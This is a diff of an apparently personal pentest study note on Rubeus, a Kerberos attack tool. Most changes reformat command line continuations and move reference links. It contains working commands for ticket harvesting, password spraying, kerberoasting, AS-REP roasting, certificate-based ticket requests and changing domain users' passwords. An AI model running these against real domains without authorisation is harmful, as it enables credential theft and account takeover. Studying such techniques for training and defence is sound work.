@@ -7,12 +7,14 @@ Rubeus is a Windows-only post-exploitation tool for attacking Kerberos. No compi
 
 NOTE: To use Rebueus you need to already be on the domain you are attacking, or alternately need to have mapped the domain controller (which normally hosts the KDC) IP address properly in C:/Windows/System32/drivers/etc/hosts.
 
+* [Rubeus](https://github.com/GhostPack/Rubeus)
+* [Kerberos](kerberos.md)
+
 ## Harvest Kerberos Tickets
 
 ```powershell
-# Harvest ticket granting tickets observed by the
-# current machine. Probably works best when run on a
-# domain controller.
+# Harvest ticket granting tickets observed by the current machine.
+# Probably works best when run on a domain controller.
 #
 Rubeus.exe harvest /interval:30
 ```
@@ -20,9 +22,9 @@ Rubeus.exe harvest /interval:30
 ## Password Spraying
 
 ```powershell
-# Spray the specified password across all known users
-# and generate a ticket giving ticket for successful
-# authentications. (Can trigger account lockouts!)
+# Spray the specified password across all known users and generate a
+# ticket giving ticket for successful authentications. (Can trigger
+# account lockouts!)
 #
 Rubeus.exe brute /password:ThePasswordToSpray /noticket
 ```
@@ -30,13 +32,15 @@ Rubeus.exe brute /password:ThePasswordToSpray /noticket
 ## Kerberoasting
 
 ```powershell
-# Extract password hashes for all known
-# kerberoastable accounts using Rubeus.
+# Extract password hashes for all known kerberoastable accounts using
+# Rubeus.
 #
 Rubeus.exe kerberoast
 ```
 
 The password hashes output here can then be cracked with Hashcat (use the 13100 hash mode).
+
+* [Using Hashcat](hashcat.md)
 
 ## AS-REP Roasting
 
@@ -53,37 +57,28 @@ To use Hashcat to crack the hashes obtained in this fashin, first insert `23$` a
 ```powershell
 # Request a ticket using a certificate from AD CS.
 #
-Rubeus.exe asktgt /user:$USER \
-                  /enctype:aes256 \
-                  /certificate:$CERTIFICATE_FILE \
-                  /password:$CERTIFICATE_FILE_PASSWORD \
-                  /outfile:$TICKET_FILE \
-                  /domain:$DOMAIN \
+Rubeus.exe asktgt /user:$USER `
+                  /enctype:aes256 `
+                  /certificate:$CERTIFICATE_FILE `
+                  /password:$CERTIFICATE_FILE_PASSWORD `
+                  /outfile:$TICKET_FILE `
+                  /domain:$DOMAIN `
                   /dc:$DC_IP_ADDRESS
 ```
 
 This is very useful if we've used an AD CS misconfiguration as described by SpectreOps' "Certified Pre-Owned" research to forge a certificate that's valid for another user.
 
+* [SpectreOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
+
 ## Change a User's Password
 
 ```powershell
-# We can use Rubeus to change the password for domain
-# users so long as our ticket is for a user with
-# permission to do so (generally the user themselves or
-# a domain admin.
+# We can use Rubeus to change the password for domain users so long as
+# our ticket is for a user with permission to do so (generally the user
+# themselves or a domain admin.
 #
-Rubeus.exe changepw /ticket:$TICKET_FILE \
-                    /new:$NEW_PASSWORD \
-                    /dc:$DC_IP_ADDRESS \
+Rubeus.exe changepw /ticket:$TICKET_FILE `
+                    /new:$NEW_PASSWORD `
+                    /dc:$DC_IP_ADDRESS `
                     /targetuser:$DOMAIN\$USER
 ```
-
-## References
-
-* [Rubeus](https://github.com/GhostPack/Rubeus)
-* [TryHackMe: Attacking Kerberos](tryhackme-attacking-kerberos.md)
-* [Kerberos](kerberos.md)
-* [Using Hashcat](hashcat.md)
-* [2022-05-10 - TryHackMe: Jr. Penetration Tester (Supplements)](../log/2022-05-10-tryhackme-jr-penetration-tester-supplements.md)
-* [SpectreOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
-* [Using "certutil"](certutil.md)
